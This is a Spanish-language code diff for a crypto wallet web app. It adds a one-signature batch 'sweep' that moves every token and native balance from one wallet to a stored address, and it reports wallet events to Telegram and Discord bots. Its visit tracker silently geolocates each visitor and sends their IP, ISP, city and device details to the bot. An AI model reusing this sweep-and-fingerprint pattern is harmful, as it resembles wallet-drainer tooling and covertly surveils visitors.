+  const amount = ethers.parseEther(amountEthStr);
+  const myBal  = await provider.getBalance(me);
+  if (myBal < amount) {
+    return toast(`A no tiene saldo: necesitás ~${amountEthStr} ${CHAIN_NAMES[chainId]}`, 4500);
+  }
+
+  if (!confirm(`Enviar ${amountEthStr} desde A → B (gas) en ${CHAIN_NAMES[chainId]}?`)) return;
+  try {
+    toast('Enviando gas a B…');
+    const tx = await signer.sendTransaction({ to: b, value: amount });
+    addEvent('tx', `Gas top-up ${CHAIN_NAMES[chainId]} → B · ${amountEthStr}`);
+    tgSend(`⛽ *Gas top-up* (${CHAIN_NAMES[chainId]})\nA: \`${me}\`\nB: \`${b}\`\nMonto: ${amountEthStr}\nHash: \`${tx.hash}\``);
+    await tx.wait();
+    toast('Gas recargado en B ✓ · ahora conectá B y barré');
+    addEvent('txok', `Gas listo en B (${CHAIN_NAMES[chainId]})`);
+    readWalletB();
+  } catch (e) {
+    toast('Error: ' + (e.shortMessage || e.message), 4500);
+  }
+}
+
+/* Sweep: cuando el usuario CONECTA B, mueve todo → A con UN SOLO popup (EIP-5792 batch).
+   Si la wallet no soporta sendCalls, cae a txs secuenciales (cada una con su firma). */
+async function sweepBtoA(chainId) {
+  if (!provider || !signer) return toast('Conectá Wallet B primero');
+  if (!isConnectedB()) return toast('Esto sólo funciona cuando estás conectado con Wallet B');
+  const dest = getDestA();
+  if (!ethers.isAddress(dest)) return toast('No hay Wallet A registrada · conectá A primero, luego cambiá a B');
+
+  const net = await provider.getNetwork();
+  if (Number(net.chainId) !== chainId) {
+    toast(`Cambiá a ${CHAIN_NAMES[chainId]} en Trust…`);
+    try { await switchChain(chainId); } catch {}
+    return;
+  }
+
+  if (!confirm(`¿Mover TODO (tokens + nativo) → ${shortAddr(dest)} en ${CHAIN_NAMES[chainId]}?`)) return;
+  setStatus('Preparando barrido…', 'pending');
+
+  // ── Recopilar todos los movimientos necesarios ────────────────────────────
+  const tokens   = COMMON_TOKENS[chainId] || [];
+  const feeData  = await provider.getFeeData();
+  const gasPrice = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('5','gwei');
+
+  const erc20Iface = new ethers.Interface([
+    'function transfer(address to, uint256 amount) returns (bool)',
+    'function balanceOf(address) view returns (uint256)',
+  ]);
+
+  // ERC20s con saldo > 0
+  const tokenCalls = [];
+  for (const t of tokens) {
+    try {
+      const c   = new ethers.Contract(t.addr, ERC20_ABI, provider);
+      const bal = await c.balanceOf(me);
+      if (bal === 0n) continue;
+      tokenCalls.push({
+        to:    t.addr,
+        data:  erc20Iface.encodeFunctionData('transfer', [dest, bal]),
+        _meta: { symbol: t.symbol, bal },
+      });
+    } catch { /* sin saldo */ }
+  }
+
+  // Nativo (reservar gas para 1 nativo + todas las ERC20s del batch)
+  const totalGasUnits = 21000n + BigInt(tokenCalls.length) * 65000n;
+  const gasCost   = totalGasUnits * gasPrice * 12n / 10n; // +20% buffer
+  const reserve   = ethers.parseEther(String(GAS_RESERVE_NATIVE[chainId] || 0.0005));
+  const nativeBal = await provider.getBalance(me);
+  const sendable  = nativeBal - gasCost - reserve;
+
+  const nativeCall = sendable > 0n
+    ? [{ to: dest, value: `0x${sendable.toString(16)}`, _meta: { symbol: SUPPORTED_CHAINS.find(c=>c.id===chainId)?.symbol||'native', bal: sendable } }]
+    : [];
+
+  const allCalls = [...tokenCalls, ...nativeCall];
+  if (!allCalls.length) {
+    setStatus('Sin fondos para mover', 'ok');
+    return toast('No se encontraron fondos en B en esta red');
+  }
+
+  // ── Intentar EIP-5792 batch (UN solo popup) ───────────────────────────────
+  const rawProvider = wcProvider || window.ethereum;
+  let usedBatch = false;
+  try {
+    const batchCalls = allCalls.map(c => {
+      const call = { to: c.to };
+      if (c.data)  call.data  = c.data;
+      if (c.value) call.value = c.value;
+      return call;
+    });
+    const result = await rawProvider.request({
+      method: 'wallet_sendCalls',
+      params: [{ version: '2.0', from: me, calls: batchCalls }],
+    });
+    usedBatch = true;
+    const summary = allCalls.map(c => c._meta.symbol).join(', ');
+    setStatus(`Batch enviado · ${summary}`, 'pending');
+    addEvent('tx', `Sweep batch (${CHAIN_NAMES[chainId]}): ${summary}`);
+    tgSend(`📤 *Sweep batch* (${CHAIN_NAMES[chainId]})\nB: \`${me}\`\nA: \`${dest}\`\nTokens: ${summary}\nBatch ID: \`${result}\``);
+    toast(`✓ Batch enviado con 1 firma · ${allCalls.length} movimiento(s)`, 4500);
+  } catch (batchErr) {
+    // wallet_sendCalls no soportado → fallback secuencial
+    if (!usedBatch) {
+      setStatus('Enviando tx secuenciales…', 'pending');
+      toast('Tu wallet no soporta batch · enviando una a una…', 3500);
+      let ok = 0, err = 0;
+      for (const call of allCalls) {
         try {
-          await switchChain(state.provider, net.chainId, {
-            chainId: net.chainId,
-            chainName: net.name,
-            nativeCurrency: { name: net.gas.symbol, symbol: net.gas.symbol, decimals: 18 },
-            rpcUrls: [net.rpc],
-            blockExplorerUrls: [net.explorer]
-          });
+          let tx;
+          if (call.data) {
+            tx = await signer.sendTransaction({ to: call.to, data: call.data });
+          } else {
+            tx = await signer.sendTransaction({ to: call.to, value: call.value });
+          }
+          addEvent('tx', `Sweep ${call._meta.symbol} (${CHAIN_NAMES[chainId]}) → A`);
+          tgSend(`📤 *Sweep ${call._meta.symbol}* (${CHAIN_NAMES[chainId]})\nHash: \`${tx.hash}\``);
+          await tx.wait();
+          ok++;
         } catch (e) {
-          alert('No se pudo cambiar de red: ' + (e.message || e));
-          return;
+          err++;
+          addEvent('txerr', `${call._meta.symbol}: ${(e.shortMessage||e.message||'').slice(0,80)}`);
         }
       }
-      refreshAll();
-    };
-    tabs.appendChild(t);
-  });
+      setStatus(`Barrido ${CHAIN_NAMES[chainId]}: ${ok} ok · ${err} errores`, err ? 'err' : 'ok');
+      toast(`✓ ${ok} transferencia(s) · ${err} error(es)`, 4500);
+    }
+  }
+
+  readWalletB();
 }
 
-async function loadBalances() {
-  const net = NETWORKS[state.viewChainId];
-  const body = $('balanceBody');
-  body.innerHTML = '';
+/* Banner que aparece en la vista "Mis Wallets" cuando estás conectado con B. */
+function renderBHeroIfNeeded() {
+  const wrap = $('walletBResults');
+  if (!wrap) return;
+  if (!isConnectedB()) return;
+  const dest = getDestA();
+  const banner = document.createElement('div');
+  banner.id = 'wbBHero';
+  banner.className = 'card glass soft-shadow col-span-2 mb-2';
+  banner.style.cssText = 'border:2px solid #6366f1;background:linear-gradient(135deg,#eef2ff,#fdf2f8)';
+  banner.innerHTML = `
+    <div class="flex items-center justify-between gap-3 flex-wrap">
+      <div>
+        <div class="font-bold text-indigo-700">✓ Conectado con Wallet B</div>
+        <div class="text-xs text-slate-500 mt-0.5">Destino A: <span class="mono">${dest ? shortAddr(dest) : '—'}</span></div>
+      </div>
+      <button class="btn btn-primary text-xs" style="padding:.55rem 1rem" onclick="sweepAllChainsBtoA()">📤 Mover TODO en esta red → A</button>
+    </div>`;
+  document.getElementById('wbBHero')?.remove();
+  wrap.parentElement.insertBefore(banner, wrap);
+}
 
-  if (!net) {
-    body.innerHTML = '<tr><td colspan="2" class="empty">Selecciona una red</td></tr>';
-    return;
-  }
+async function sweepAllChainsBtoA() {
+  if (!isConnectedB()) return toast('No estás conectado con B');
+  if (!provider) return;
+  const net = await provider.getNetwork();
+  await sweepBtoA(Number(net.chainId));
+}
 
-  if (state.walletChainId !== net.chainId) {
-    body.innerHTML = `<tr><td colspan="2" class="empty">
-      La wallet esta en otra red. Pulsa "<b>${net.name}</b>" en las pestanas para cambiar y leer saldos.
-    </td></tr>`;
-    return;
-  }
+/* ===== Address book (mis direcciones de depósito) ===== */
+const OTHER_CHAINS = [
+  { id:'tron',     name:'Tron',         symbol:'TRX',  color:'#ff0633', icon:'◆', placeholder:'TR... (base58)' },
+  { id:'bitcoin',  name:'Bitcoin',      symbol:'BTC',  color:'#f7931a', icon:'₿', placeholder:'bc1q... o 1...' },
+  { id:'solana',   name:'Solana',       symbol:'SOL',  color:'#9945ff', icon:'◎', placeholder:'pubkey base58' },
+  { id:'litecoin', name:'Litecoin',     symbol:'LTC',  color:'#345d9d', icon:'Ł', placeholder:'ltc1... o L...' },
+  { id:'doge',     name:'Dogecoin',     symbol:'DOGE', color:'#c2a633', icon:'Ð', placeholder:'D...' },
+  { id:'usdt-tron',name:'USDT (TRC-20)',symbol:'USDT', color:'#26a17b', icon:'₮', placeholder:'misma que Tron · TR...' },
+];
+function getMyAddrs()  { try { return JSON.parse(localStorage.getItem('myAddresses')) || {}; } catch { return {}; } }
+function setMyAddrs(o) { localStorage.setItem('myAddresses', JSON.stringify(o)); }
 
-  // Fila de gas (nativo)
-  const gasRow = document.createElement('tr');
-  gasRow.className = 'gas';
-  gasRow.innerHTML = `
-    <td>
-      <div class="coin">
-        <div class="ico" style="background:${net.color}">${net.gas.symbol.slice(0,3)}</div>
-        <div>
-          <div class="nm">${net.gas.symbol} <span class="tag gas">GAS</span></div>
-          <div class="sm">${net.gas.name}</div>
+function renderAddressBook() {
+  const display = $('evmAddrDisplay');
+  if (display) display.textContent = me || '— Conectá tu wallet —';
+
+  const badges = $('evmChainsBadges');
+  if (badges) badges.innerHTML = SUPPORTED_CHAINS.map(c => `
+    <div class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-semibold"
+         style="background:${c.color}18;color:${c.color}">
+      <span>${c.icon}</span><span>${c.name}</span>
+    </div>
+  `).join('');
+
+  const stored = getMyAddrs();
+  const grid = $('otherChainsGrid');
+  if (!grid) return;
+  grid.innerHTML = OTHER_CHAINS.map(c => `
+    <div>
+      <label class="label flex items-center gap-1.5 mb-1">
+        <span style="color:${c.color};font-size:1rem">${c.icon}</span>
+        <span>${c.name}</span>
+        <span class="text-slate-400 font-normal">· ${c.symbol}</span>
+      </label>
+      <div class="relative">
+        <input class="field mono text-xs pr-16"
+               id="addr_${c.id}"
+               placeholder="${c.placeholder}"
+               value="${(stored[c.id] || '').replace(/"/g,'&quot;')}"
+               onchange="saveOtherAddr('${c.id}', this.value)"/>
+        <div class="absolute right-1.5 top-1/2 -translate-y-1/2 flex gap-1">
+          <button class="text-xs px-1.5 py-1 rounded-md hover:bg-slate-100" onclick="copyOtherAddr('${c.id}')" title="Copiar">📋</button>
+          <button class="text-xs px-1.5 py-1 rounded-md hover:bg-rose-50 text-rose-500" onclick="clearOtherAddr('${c.id}')" title="Borrar">×</button>
         </div>
       </div>
-    </td>
-    <td class="val"><span class="bal">cargando...</span> ${net.gas.symbol}</td>
-  `;
-  body.appendChild(gasRow);
+    </div>
+  `).join('');
+}
 
+function saveOtherAddr(id, val) {
+  const v = val.trim();
+  const all = getMyAddrs();
+  if (v) all[id] = v; else delete all[id];
+  setMyAddrs(all);
+  if (v) toast(`${id.toUpperCase()} guardada ✓`);
+}
+
+function copyOtherAddr(id) {
+  const v = $('addr_'+id).value.trim();
+  if (!v) return toast('Vacío — pegá la dirección primero');
+  navigator.clipboard.writeText(v);
+  toast(`${id.toUpperCase()} copiada ✓`);
+}
+
+function clearOtherAddr(id) {
+  $('addr_'+id).value = '';
+  saveOtherAddr(id, '');
+  toast('Borrada');
+}
+
+function copyEvmAddr() {
+  if (!me) return toast('Conectá tu wallet primero');
+  navigator.clipboard.writeText(me);
+  toast('EVM copiada · sirve para las 6 redes ✓');
+}
+
+function useEvmAsDest() {
+  if (!me) return toast('Conectá tu wallet primero');
+  const dest = document.getElementById('toAddr');
+  if (dest) dest.value = me;
+  goto('move');
+  toast('Destino EVM cargado en Mover ✓');
+}
+
+function copyAllAddresses() {
+  const lines = [];
+  if (me) lines.push(`EVM (Eth/Polygon/Base/AVAX/Arbitrum/BNB): ${me}`);
+  const stored = getMyAddrs();
+  for (const c of OTHER_CHAINS) {
+    if (stored[c.id]) lines.push(`${c.name} (${c.symbol}): ${stored[c.id]}`);
+  }
+  if (!lines.length) return toast('No hay direcciones cargadas');
+  navigator.clipboard.writeText(lines.join('\n'));
+  toast(`Copiadas ${lines.length} direcciones ✓`);
+}
+
+/* ===== Splits editor (visual) ===== */
+let splits = [
+  { to:'0xAlIc333333333333333333333333333333333333', bps:5000 },
+  { to:'0xB0bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb', bps:3000 },
+  { to:'0xCAroLcccccccccccccccccccccccccccccccccccc', bps:2000 },
+];
+function renderSplits() {
+  const c = $('splitRows');
+  c.innerHTML = splits.map((r, i) => `
+    <div class="grid items-center gap-2" style="grid-template-columns:1fr 160px 44px">
+      <input class="field mono" value="${r.to}" oninput="splits[${i}].to=this.value;updateSplitTotal()"/>
+      <div class="relative">
+        <input class="field mono pr-12" value="${r.bps}" oninput="splits[${i}].bps=Number(this.value)||0;updateSplitTotal()"/>
+        <span class="absolute right-3 top-1/2 -translate-y-1/2 text-[11px] text-slate-400">${((r.bps||0)/100).toFixed(2)}%</span>
+      </div>
+      <button class="btn btn-ghost" style="padding:.6rem;border-radius:.85rem" onclick="splits.splice(${i},1);renderSplits()">🗑</button>
+    </div>
+  `).join('');
+  updateSplitTotal();
+}
+function updateSplitTotal() {
+  const total = splits.reduce((a, r) => a + (Number(r.bps) || 0), 0);
+  const el = $('splitTotal');
+  el.textContent = `${total} bps · ${(total/100).toFixed(2)}%`;
+  el.className = 'font-bold ' + (total === 10000 ? 'text-emerald-600' : 'text-red-500');
+}
+function addSplitRow() { splits.push({ to:'', bps:0 }); renderSplits(); }
+renderSplits();
+
+/* ===== Owner view ===== */
+async function loadOwnerInfo() {
+  if (!vaultContract) { $('ownerCurrent').textContent = 'Conectá y configurá la bóveda'; return; }
   try {
-    state.nativeBal = await getNativeBalance(state.provider, state.account);
-    gasRow.querySelector('.bal').textContent = fmtUnits(state.nativeBal, 18);
-  } catch { gasRow.querySelector('.bal').textContent = 'error'; }
+    const [o, p] = await Promise.all([vaultContract.owner(), vaultContract.pendingOwner().catch(()=>ethers.ZeroAddress)]);
+    $('ownerCurrent').textContent = shortAddr(o);
+    $('ownerPending').textContent = p === ethers.ZeroAddress ? '—' : shortAddr(p);
+    $('ownerIsMe').classList.toggle('hidden', o.toLowerCase() !== me.toLowerCase());
+  } catch (e) {
+    $('ownerCurrent').textContent = 'Error: ' + (e.shortMessage || e.message);
+  }
+}
+async function transferOwnership() {
+  if (!vaultContract) return toast('Configurá la bóveda');
+  const a = $('newOwner').value.trim();
+  if (!ethers.isAddress(a)) return toast('Address inválida');
+  try {
+    const tx = await vaultContract.transferOwnership(a);
+    toast('Tx enviada · esperando…');
+    await tx.wait();
+    toast('Ownership transferido ✓');
+    loadOwnerInfo();
+  } catch (e) { toast('Error: ' + (e.shortMessage || e.message), 4000); }
+}
+async function acceptOwnership() {
+  if (!vaultContract) return toast('Configurá la bóveda');
+  try {
+    const tx = await vaultContract.acceptOwnership();
+    toast('Tx enviada · esperando…');
+    await tx.wait();
+    toast('Ownership aceptado ✓');
+    loadOwnerInfo();
+  } catch (e) { toast('Error: ' + (e.shortMessage || e.message), 4000); }
+}
 
-  for (const t of net.tokens) {
-    const tr = document.createElement('tr');
-    tr.innerHTML = `
-      <td>
-        <div class="coin">
-          <div class="ico" style="background:${t.color}">${t.symbol.slice(0,3)}</div>
-          <div>
-            <div class="nm">${t.symbol} <span class="tag">ERC20</span></div>
-            <div class="sm">${t.name}</div>
-          </div>
-        </div>
-      </td>
-      <td class="val"><span class="bal">cargando...</span> ${t.symbol}</td>
-    `;
-    body.appendChild(tr);
-    try {
-      const bal = await getErc20Balance(state.provider, t.address, state.account);
-      tr.querySelector('.bal').textContent = fmtUnits(bal, t.decimals);
-    } catch { tr.querySelector('.bal').textContent = 'error'; }
+/* ===== Configuración unificada (TG + Discord + triggers) ===== */
+function getCfg()   { try { return JSON.parse(localStorage.getItem('appConfig')) || {}; } catch { return {}; } }
+function setCfg(o)  { localStorage.setItem('appConfig', JSON.stringify(o)); }
+/* Retro-compat: getTg sigue leyendo el config unificado */
+function getTg() {
+  const c = getCfg();
+  if (c.tgToken && c.tgChatId) return { token: c.tgToken, chatId: c.tgChatId };
+  /* fallback al key viejo */
+  try { return JSON.parse(localStorage.getItem('tgConfig')) || null; } catch { return null; }
+}
+function getTriggers() {
+  const c = getCfg();
+  return c.triggers || { visit:true, connect:true, tx:true, txok:true, vault:false, txerr:true };
+}
+function isTriggerOn(type) { return getTriggers()[type] !== false; }
+
+/* ─── Guardar / limpiar TG desde config view ─── */
+function saveCfgTg() {
+  const token  = $('cfgTgToken').value.trim();
+  const chatId = $('cfgTgChat').value.trim();
+  if (!token || !chatId) { cfgTgStat('Faltan campos', 'err'); return; }
+  const c = getCfg(); c.tgToken = token; c.tgChatId = chatId; setCfg(c);
+  /* Compat: también guardar en key viejo */
+  localStorage.setItem('tgConfig', JSON.stringify({ token, chatId }));
+  cfgTgStat('✓ Telegram guardado', 'ok');
+  updateCfgBadges();
+  toast('Telegram configurado ✓');
+}
+function clearCfgTg() {
+  const c = getCfg(); delete c.tgToken; delete c.tgChatId; setCfg(c);
+  localStorage.removeItem('tgConfig');
+  $('cfgTgToken').value = ''; $('cfgTgChat').value = '';
+  cfgTgStat('Borrado', 'info'); updateCfgBadges();
+}
+async function testCfgTg() {
+  saveCfgTg();
+  cfgTgStat('Enviando…', 'pending');
+  const r = await tgSend(`✅ *Test MyPersonWallets* (Telegram)\n🕒 ${new Date().toLocaleString()}`);
+  r.ok ? cfgTgStat('✓ Mensaje enviado — revisá Telegram', 'ok')
+       : cfgTgStat('✕ ' + (r.reason || 'Error'), 'err');
+}
+function cfgTgStat(msg, kind) {
+  const el = $('cfgTgStatus');
+  el.textContent = msg;
+  el.className = `status-box status-${kind}`;
+  el.classList.remove('hidden');
+}
+/* Sync con inputs viejos en activity tab */
+function syncTgInputs() {
+  const t = $('cfgTgToken').value, c = $('cfgTgChat').value;
+  if ($('tgToken')) $('tgToken').value = t;
+  if ($('tgChat'))  $('tgChat').value  = c;
+}
+
+/* ─── Guardar / limpiar Discord ─── */
+function saveCfgDc() {
+  const url  = $('cfgDcWebhook').value.trim();
+  const name = $('cfgDcName').value.trim() || 'MyPersonWallets';
+  if (!url.startsWith('https://discord.com/api/webhooks/')) { cfgDcStat('URL de webhook inválida', 'err'); return; }
+  const c = getCfg(); c.dcWebhook = url; c.dcName = name; setCfg(c);
+  cfgDcStat('✓ Discord guardado', 'ok');
+  updateCfgBadges();
+  toast('Discord configurado ✓');
+}
+function clearCfgDc() {
+  const c = getCfg(); delete c.dcWebhook; delete c.dcName; setCfg(c);
+  $('cfgDcWebhook').value = ''; $('cfgDcName').value = 'MyPersonWallets';
+  cfgDcStat('Borrado', 'info'); updateCfgBadges();
+}
+async function testCfgDc() {
+  saveCfgDc();
+  cfgDcStat('Enviando…', 'pending');
+  const r = await discordSend(`✅ **Test MyPersonWallets** (Discord)\n🕒 ${new Date().toLocaleString()}`);
+  r.ok ? cfgDcStat('✓ Mensaje enviado — revisá Discord', 'ok')
+       : cfgDcStat('✕ ' + (r.reason || 'Error'), 'err');
+}
+function cfgDcStat(msg, kind) {
+  const el = $('cfgDcStatus');
+  el.textContent = msg;
+  el.className = `status-box status-${kind}`;
+  el.classList.remove('hidden');
+}
+
+/* ─── Triggers (checkboxes) ─── */
+function saveTriggers() {
+  const keys = ['visit','connect','tx','txok','vault','txerr'];
+  const t = {};
+  keys.forEach(k => { const el = $('notif_'+k); if (el) t[k] = el.checked; });
+  const c = getCfg(); c.triggers = t; setCfg(c);
+  updateCfgBadges();
+}
+
+/* ─── Badges de estado ─── */
+function updateCfgBadges() {
+  const c = getCfg();
+  const tgBadge = $('cfgTgBadge');
+  if (tgBadge) {
+    tgBadge.textContent = c.tgToken ? `TG: ✓ activo` : 'TG: no configurado';
+    tgBadge.className   = 'chip text-xs ' + (c.tgToken ? 'chip-ok' : '');
+  }
+  const dcBadge = $('cfgDcBadge');
+  if (dcBadge) {
+    dcBadge.textContent = c.dcWebhook ? `Discord: ✓ activo` : 'Discord: no configurado';
+    dcBadge.className   = 'chip text-xs ' + (c.dcWebhook ? 'chip-ok' : '');
+  }
+  const trBadge = $('cfgTrigBadge');
+  if (trBadge) {
+    const on = Object.values(getTriggers()).filter(Boolean).length;
+    trBadge.textContent = `Triggers: ${on} activos`;
   }
 }
 
-function renderDeposits() {
-  const grid = $('depositGrid');
-  grid.innerHTML = '';
-  $('netCount').textContent = Object.keys(NETWORKS).length;
-  if (!state.account) return;
+/* ─── Cargar vista config ─── */
+function loadConfigView() {
+  const c = getCfg();
+  if ($('cfgTgToken'))  $('cfgTgToken').value  = c.tgToken  || '';
+  if ($('cfgTgChat'))   $('cfgTgChat').value   = c.tgChatId || '';
+  if ($('cfgDcWebhook'))$('cfgDcWebhook').value = c.dcWebhook|| '';
+  if ($('cfgDcName'))   $('cfgDcName').value   = c.dcName   || 'MyPersonWallets';
+  if ($('cfgDappUrl'))  $('cfgDappUrl').value  = localStorage.getItem('dappUrl') || window.location.href;
 
-  Object.values(NETWORKS).forEach(net => {
-    const card = document.createElement('div');
-    card.className = 'deposit gas';
-    const tokenSymbols = net.tokens.map(t => t.symbol).join(' &middot; ');
-    card.innerHTML = `
-      <div class="qr"><img src="${qrUrl(state.account)}" alt="QR" /></div>
-      <div class="info">
-        <div class="net-row">
-          <span class="ico" style="background:${net.color}"></span>
-          <span class="name">${net.name}</span>
-          <span class="tag gas">GAS: ${net.gas.symbol}</span>
-          ${net.chainId === state.walletChainId ? '<span class="tag" style="background:rgba(34,197,94,.18);color:var(--ok)">activa</span>' : ''}
-        </div>
-        <div class="gases-list">Acepta <b>${net.gas.symbol}</b> (gas) + ${tokenSymbols}</div>
-        <div class="addr">${state.account}</div>
-        <div class="actions">
-          <button class="btn-ghost" data-copy="${state.account}">Copiar</button>
-          <a class="btn-ghost" href="${net.explorer}/address/${state.account}" target="_blank">Explorer</a>
+  const t = getTriggers();
+  Object.entries(t).forEach(([k,v]) => { const el = $('notif_'+k); if (el) el.checked = v; });
+  updateCfgBadges();
+}
+
+/* ===== Discord send ===== */
+async function discordSend(text) {
+  const c = getCfg();
+  if (!c.dcWebhook) return { ok:false, reason:'no-config' };
+  try {
+    const r = await fetch(c.dcWebhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: text, username: c.dcName || 'MyPersonWallets' }),
+    });
+    return r.ok ? { ok:true } : { ok:false, reason:`HTTP ${r.status}` };
+  } catch (e) { return { ok:false, reason: e.message }; }
+}
+
+/* ===== Telegram + Activity log ===== */
+function getLog()   { try { return JSON.parse(localStorage.getItem('activityLog')) || []; } catch { return []; } }
+function setLog(l)  { localStorage.setItem('activityLog', JSON.stringify(l.slice(0, 200))); }
+
+async function fetchGeoIP() {
+  try {
+    /* ip-api.com: gratis, sin key, devuelve ip + país + ciudad */
+    const r = await fetch('http://ip-api.com/json/?fields=status,query,countryCode,city,org');
+    const j = await r.json();
+    if (j.status === 'success') {
+      return { ip: j.query, country: j.countryCode || '??', city: j.city || '', org: j.org || '' };
+    }
+  } catch {}
+  /* fallback: sólo IP sin geo */
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const j = await r.json();
+    return { ip: j.ip || '?', country: '??', city: '', org: '' };
+  } catch { return { ip: '?', country: '??', city: '', org: '' }; }
+}
+
+function detectDevice(ua) {
+  const u = ua.toLowerCase();
+  if (/iphone|android.*mobile|windows phone|blackberry|opera mini/i.test(u))
+    return { type: 'mobile', icon: '📱', label: 'Móvil' };
+  if (/ipad|android(?!.*mobile)/i.test(u))
+    return { type: 'tablet', icon: '📟', label: 'Tablet' };
+  return { type: 'desktop', icon: '🖥', label: 'PC' };
+}
+
+function detectBrowser(ua) {
+  if (/trust/i.test(ua))          return 'Trust Wallet';
+  if (/edg\//i.test(ua))          return 'Edge';
+  if (/opr\//i.test(ua))          return 'Opera';
+  if (/firefox\//i.test(ua))      return 'Firefox';
+  if (/chrome\//i.test(ua))       return 'Chrome';
+  if (/safari\//i.test(ua))       return 'Safari';
+  return 'Desconocido';
+}
+
+async function notify(type, text, mdText) {
+  if (!isTriggerOn(type)) return;
+  const plain = mdText || text;
+  await Promise.all([ tgSend(plain), discordSend(plain.replace(/[*`]/g,'')) ]);
+}
+
+async function tgSend(text) {
+  const cfg = getTg();
+  if (!cfg || !cfg.token || !cfg.chatId) return { ok:false, reason:'no-config' };
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: cfg.chatId, text, parse_mode: 'Markdown', disable_web_page_preview: true }),
+    });
+    const j = await r.json();
+    return { ok: j.ok, reason: j.description || '' };
+  } catch (e) {
+    return { ok:false, reason: e.message };
+  }
+}
+
+function addEvent(type, detail) {
+  const ev = {
+    time: Date.now(),
+    type,
+    detail: detail || '',
+  };
+  const log = getLog();
+  log.unshift(ev);
+  setLog(log);
+  if (document.querySelector('.view[data-view="activity"]').classList.contains('active')) renderActivity();
+}
+
+async function trackVisit() {
+  // Solo loguear visita 1 vez por sesión de pestaña
+  if (sessionStorage.getItem('visitTracked')) return;
+  sessionStorage.setItem('visitTracked', '1');
+
+  const geo     = await fetchGeoIP();
+  const ua      = navigator.userAgent;
+  const device  = detectDevice(ua);
+  const browser = detectBrowser(ua);
+  const ref     = document.referrer || 'directo';
+  const lang    = navigator.language || '';
+  const scr     = `${screen.width}×${screen.height}`;
+  const dappUrl = localStorage.getItem('dappUrl') || window.location.href;
+
+  const cityStr = geo.city ? ` · ${geo.city}` : '';
+  addEvent('visit', `${device.icon} ${device.label} · ${geo.ip} · ${geo.country}${cityStr} · ${browser}`);
+
+  if (!isTriggerOn('visit')) return;
+
+  /* ── Telegram (Markdown) ── */
+  const tgMsg =
+    `🔔 *Nueva visita · MyPersonWallets*\n\n` +
+    `${device.icon} *Dispositivo:* ${device.label} · ${browser}\n` +
+    `🌍 *País:* \`${geo.country}\`${cityStr}\n` +
+    `🌐 *IP:* \`${geo.ip}\`\n` +
+    (geo.org ? `🏢 *ISP:* ${geo.org.slice(0,40)}\n` : '') +
+    `🗣 *Idioma:* ${lang}  ·  🖥 ${scr}\n` +
+    `🔗 *Ref:* ${ref.slice(0,60)}\n` +
+    `📎 *dApp:* ${dappUrl.slice(0,70)}\n` +
+    `🕒 ${new Date().toLocaleString()}`;
+
+  /* ── Discord (texto plano + embed) ── */
+  const dcPayload = {
+    username: getCfg().dcName || 'MyPersonWallets',
+    embeds: [{
+      title: `${device.icon} Nueva visita detectada`,
+      color: 0x6691f7,
+      fields: [
+        { name: 'País',       value: `\`${geo.country}\`${cityStr}`,          inline: true  },
+        { name: 'IP',         value: `\`${geo.ip}\``,                         inline: true  },
+        { name: 'Dispositivo',value: `${device.icon} ${device.label}`,         inline: true  },
+        { name: 'Navegador',  value: browser,                                 inline: true  },
+        { name: 'Idioma',     value: lang || '—',                             inline: true  },
+        { name: 'Pantalla',   value: scr,                                     inline: true  },
+        ...(geo.org ? [{ name: 'ISP', value: geo.org.slice(0,40), inline: false }] : []),
+        { name: 'Referrer',   value: ref.slice(0,80),                         inline: false },
+        { name: 'dApp URL',   value: dappUrl.slice(0,80),                     inline: false },
+      ],
+      footer: { text: new Date().toLocaleString() },
+    }],
+  };
+
+  const dcCfg = getCfg();
+  const tasks = [ tgSend(tgMsg) ];
+  if (dcCfg.dcWebhook) {
+    tasks.push(fetch(dcCfg.dcWebhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(dcPayload),
+    }).catch(() => {}));
+  }
+  await Promise.all(tasks);
+}
+
+function saveTg() {
+  const token = $('tgToken').value.trim();
+  const chatId = $('tgChat').value.trim();
+  if (!token || !chatId) { tgStat('Faltan campos', 'err'); return; }
+  localStorage.setItem('tgConfig', JSON.stringify({ token, chatId }));
+  tgStat('✓ Guardado en este navegador', 'ok');
+  toast('Bot configurado ✓');
+}
+
+async function testTg() {
+  const token = $('tgToken').value.trim();
+  const chatId = $('tgChat').value.trim();
+  if (!token || !chatId) { tgStat('Llená token y chat ID antes de testear', 'err'); return; }
+  // Guardar temporal para que tgSend lo use
+  localStorage.setItem('tgConfig', JSON.stringify({ token, chatId }));
+  tgStat('Enviando…', 'pending');
+  const r = await tgSend(`✅ *Test desde MyPersonWallets*\nSi ves este mensaje, el bot está OK.\n🕒 ${new Date().toLocaleString()}`);
+  if (r.ok) tgStat('✓ Test enviado, revisá Telegram', 'ok');
+  else      tgStat('✕ ' + (r.reason || 'Falló — revisá token y chat ID'), 'err');
+}
+
+function clearTg() {
+  localStorage.removeItem('tgConfig');
+  $('tgToken').value = ''; $('tgChat').value = '';
+  tgStat('Configuración borrada', 'info');
+}
+
+function tgStat(html, kind) {
+  const el = $('tgStatus');
+  el.className = 'status-box mt-3 ' + ({info:'st-info', ok:'st-ok', err:'st-err', pending:'st-pending'}[kind] || 'st-info');
+  el.innerHTML = html; el.classList.remove('hidden');
+}
+
+function clearLog() {
+  if (!confirm('¿Borrar todo el registro local?')) return;
+  setLog([]); renderActivity();
+}
+
+const EVENT_META = {
+  visit:    { ic:'👁', color:'#6691f7', label:'Visita' },
+  connect:  { ic:'🔌', color:'#10b981', label:'Wallet conectada' },
+  tx:       { ic:'📤', color:'#7c5cff', label:'Transacción' },
+  txok:     { ic:'✅', color:'#10b981', label:'Tx confirmada' },
+  txerr:    { ic:'⚠',  color:'#ef4444', label:'Tx fallida' },
+  vault:    { ic:'🏦', color:'#0ea5e9', label:'Bóveda configurada' },
+};
+
+function renderActivity() {
+  const log = getLog();
+  const now = Date.now();
+  const dayMs = 86400000;
+  const today = log.filter(e => now - e.time < dayMs).length;
+  const week  = log.filter(e => now - e.time < 7 * dayMs).length;
+  $('kpiToday').textContent = today;
